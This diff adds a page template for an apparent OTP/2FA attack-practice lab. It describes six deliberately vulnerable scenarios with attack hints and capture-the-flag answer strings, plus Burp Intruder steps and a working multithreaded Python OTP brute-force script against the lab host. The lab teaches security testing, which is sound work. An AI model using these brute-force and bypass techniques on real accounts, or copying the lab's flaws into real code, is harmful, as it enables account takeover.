@@ -1,0 +1,166 @@
+<%- include('../partials/navbar') %>
+  <main class="main-content">
+    <div class="top-header">
+      <span class="header-title">OTP Security Lab</span>
+      <div class="header-right">
+        <a href="/profile/<%= user.id %>" class="header-user">
+          <div class="header-avatar"><%= ((user.first_name||user.username).charAt(0)).toUpperCase() %></div>
+        </a>
+      </div>
+    </div>
+    <div class="page-body">
+      <div class="page-header">
+        <h1>OTP / 2FA Attack Practice</h1>
+        <p>Six real-world OTP vulnerabilities found in bug bounty programs. Each has its own attack technique, flag, and Burp Suite exercise.</p>
+      </div>
+
+      <%
+        const scenarios = [
+          {
+            id:       'brute-force',
+            title:    'OTP Brute Force',
+            badge:    'No Rate Limit',
+            badgeColor: 'danger',
+            icon:     '🔁',
+            severity: 'High',
+            desc:     '6-digit OTP with no rate limiting, no lockout, and 1-hour expiry. Brute force all 1,000,000 combinations.',
+            attack:   'Burp Intruder / Python loop through 000000–999999',
+            flag:     'FLAG{OTP_BRUTE_FORCE_NO_RATELIMIT_CONFIRMED}',
+          },
+          {
+            id:       'bypass',
+            title:    'OTP Parameter Bypass',
+            badge:    'Logic Flaw',
+            badgeColor: 'danger',
+            icon:     '🪄',
+            severity: 'Critical',
+            desc:     'Server trusts client-supplied parameters like bypass=true or skip_otp=true to skip OTP verification entirely.',
+            attack:   'Burp Repeater — add {"bypass":true} to the JSON body',
+            flag:     'FLAG{OTP_BYPASS_PARAMETER_MANIPULATION}',
+          },
+          {
+            id:       'leaked',
+            title:    'OTP Leaked in Response',
+            badge:    'Info Disclosure',
+            badgeColor: 'warning',
+            icon:     '📤',
+            severity: 'Critical',
+            desc:     'The OTP is returned inside the API response body in debug fields. No brute force needed — just read the response.',
+            attack:   'POST to /otp/leaked/send — read the debug.otp_generated field',
+            flag:     'FLAG{OTP_LEAKED_IN_API_RESPONSE_BODY}',
+          },
+          {
+            id:       'predictable',
+            title:    'Predictable OTP Algorithm',
+            badge:    'Weak Crypto',
+            badgeColor: 'warning',
+            icon:     '🔮',
+            severity: 'High',
+            desc:     'OTP generated using MD5(username + floor(timestamp/60000)). Predictable offline if username is known.',
+            attack:   'Compute: MD5(username_floor(Date.now()/60000)) % 1000000',
+            flag:     'FLAG{OTP_PREDICTABLE_MD5_TIMESTAMP_ALGO}',
+          },
+          {
+            id:       'reuse',
+            title:    'OTP Reuse (Not Invalidated)',
+            badge:    'Logic Flaw',
+            badgeColor: 'warning',
+            icon:     '♻️',
+            severity: 'High',
+            desc:     'OTP remains valid after successful verification. Same OTP can be used multiple times within the expiry window.',
+            attack:   'Verify once, then re-send the same OTP — it still passes',
+            flag:     'FLAG{OTP_REUSE_NOT_INVALIDATED_AFTER_USE}',
+          },
+          {
+            id:       'short',
+            title:    'Short OTP (4-digit)',
+            badge:    'Low Entropy',
+            badgeColor: 'info',
+            icon:     '🔢',
+            severity: 'Medium',
+            desc:     '4-digit OTP has only 10,000 combinations. With no rate limit, brute force completes in seconds.',
+            attack:   'Burp Intruder — iterate 0000–9999 (10x faster than 6-digit)',
+            flag:     'FLAG{OTP_SHORT_4DIGIT_LOW_ENTROPY_BYPASS}',
+          },
+        ];
+      %>
+
+      <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(340px,1fr));gap:18px;">
+        <% scenarios.forEach((s, i) => { %>
+        <div class="card" style="display:flex;flex-direction:column;">
+          <div class="card-header">
+            <div style="display:flex;align-items:center;gap:10px;">
+              <span style="font-size:22px;"><%= s.icon %></span>
+              <div>
+                <h3 style="font-size:14px;"><%= s.title %></h3>
+                <div style="display:flex;gap:6px;margin-top:4px;">
+                  <span class="badge badge-<%= s.badgeColor %>" style="font-size:10px;"><%= s.badge %></span>
+                  <span class="badge badge-gray" style="font-size:10px;"><%= s.severity %></span>
+                </div>
+              </div>
+            </div>
+          </div>
+          <div class="card-body" style="flex:1;">
+            <p style="font-size:13px;color:var(--text-muted);line-height:1.6;margin-bottom:12px;"><%= s.desc %></p>
+            <div style="background:var(--page-bg);border:1px solid var(--border);border-radius:var(--radius);padding:10px;margin-bottom:12px;">
+              <div style="font-size:10px;font-weight:700;color:var(--text-muted);text-transform:uppercase;letter-spacing:0.5px;margin-bottom:4px;">Attack</div>
+              <div style="font-size:11px;color:var(--text);"><%= s.attack %></div>
+            </div>
+            <% if(locals.lab && lab.showFlags){ %>
+            <div style="font-size:10px;font-family:monospace;color:var(--success);background:var(--success-bg);padding:6px 8px;border-radius:4px;">🚩 <%= s.flag %></div>
+            <% } %>
+          </div>
+          <div class="card-footer">
+            <a href="/otp/<%= s.id %>" class="btn btn-primary btn-sm">Start Attack →</a>
+          </div>
+        </div>
+        <% }) %>
+      </div>
+
+      <!-- Attack reference card -->
+      <div class="card" style="margin-top:24px;">
+        <div class="card-header"><h3>Quick Attack Reference</h3></div>
+        <div class="card-body">
+          <div style="display:grid;grid-template-columns:1fr 1fr;gap:20px;">
+            <div>
+              <div style="font-size:12px;font-weight:700;margin-bottom:8px;">Burp Suite Intruder — OTP Brute Force</div>
+              <pre style="font-size:11px;">1. Open /otp/brute-force in browser
+2. Click "Verify OTP" with wrong code
+3. In Burp: right-click request → Send to Intruder
+4. Positions tab: clear all, highlight OTP value → Add §
+5. Payloads tab: Numbers 0–999999, Min/Max digits 6
+6. Options: threads=20, disable "URL-encode"
+7. Start Attack → filter by response length (success is longer)</pre>
+            </div>
+            <div>
+              <div style="font-size:12px;font-weight:700;margin-bottom:8px;">Python — Fast OTP Brute Force</div>
+              <pre style="font-size:11px;">import requests, threading
+
+SESSION = "your_SYNTEX_SESS_cookie_here"
+BASE    = "http://syntex.local"
+HEADERS = {"Cookie": f"SYNTEX_SESS={SESSION}"}
+found   = False
+
+def try_otp(otp):
+    global found
+    if found: return
+    r = requests.get(
+        f"{BASE}/otp/brute-force/verify",
+        params={"otp": str(otp).zfill(6)},
+        headers=HEADERS
+    )
+    if r.json().get("success"):
+        found = True
+        print(f"[+] OTP found: {str(otp).zfill(6)}")
+        print(r.json().get("flag"))
+
+with __import__('concurrent.futures').ThreadPoolExecutor(50) as ex:
+    ex.map(try_otp, range(1000000))</pre>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </main>
+</div>
+<%- include('../partials/footer') %>
